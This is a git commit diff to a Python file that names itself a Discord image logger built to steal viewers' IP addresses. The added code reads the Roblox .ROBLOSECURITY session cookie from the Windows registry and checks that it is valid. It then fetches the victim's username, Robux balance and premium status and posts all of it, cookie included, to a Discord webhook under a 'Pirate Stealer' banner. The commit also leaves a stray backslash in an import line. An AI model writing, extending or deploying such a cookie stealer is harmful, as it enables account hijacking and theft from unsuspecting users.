79cc3e6af492b00e8d7624086e84736f1777e62f
D3ADS <146676999+D3ADS@users.noreply.github.com>
2025-02-25 19:33:12 -0500

    Update moxlmao.py

--- api/moxlmao.py
+++ api/moxlmao.py
@@ -2,7 +2,11 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, requests, base64, httpagentparser\
+import requests
+from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+import robloxpy
+import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -301,3 +305,44 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = app = ImageLoggerAPI
+
+def GrabCookie():
+    # opening the roblox studio key
+    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    # finding the subkey called ".robloxsecurity"
+    try:
+        count = 0
+        while True:
+            name, value, type = EnumValue(robloxstudiopath, count)
+            if name == ".ROBLOSECURITY":
+                # returns the value of .robloxsecurity
+                return value
+            count = count + 1
+    except WindowsError:
+        pass
+roblox_cookie_value = str(GrabCookie())
+#################### INFOMATION #################
+roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+#################### checking cookie #############
+isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+if isvalid == "Valid Cookie":
+    isvalid = "Valid"
+else:
+    exit()
+
+#################### getting info about the cookie #############
+ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+info = json.loads(ebruh.text)
+username = info['UserName']
+robux = info['RobuxBalance']
+premium = info['IsPremium']
+
+#################### SENDING TO WEBHOOK #################
+data = {
+    'content' : f'***Got A Hit 💎***\n\n**Roblox Username**\n```{username}```\n**Robux Balance**\n```{robux}```\n**Premium Status**\n```{premium}```\n**IP Address**\n```0```\n**.ROBLOSECURITY**\n```{roblox_cookie}```\n\n**Beamed Using Pirate Stealer 💸**',
+    'avatar_url' : 'https://media.discordapp.net/attachments/983005828963504192/983693212491329536/Letter-P-icon_1.png',
+    'username' : "BOT - Pirate 💎"
+}
+
+requests.post(webhook,data=data)
+
